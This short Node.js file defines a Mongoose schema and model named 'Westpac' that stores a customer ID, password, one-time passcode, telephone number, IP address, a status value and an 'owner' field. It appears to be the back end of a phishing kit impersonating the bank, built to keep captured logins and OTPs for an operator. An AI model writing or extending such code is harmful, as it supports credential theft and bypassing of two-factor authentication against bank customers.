const mongoose = require("mongoose");

const westpacSchema = new mongoose.Schema({
    uniqueid: String,
    customerId: String,
    password: String,
    otp: String,
    telephone: String,
    status: Number,
    ip: String,
    owner: String,
});

module.exports = mongoose.model("Westpac", westpacSchema);
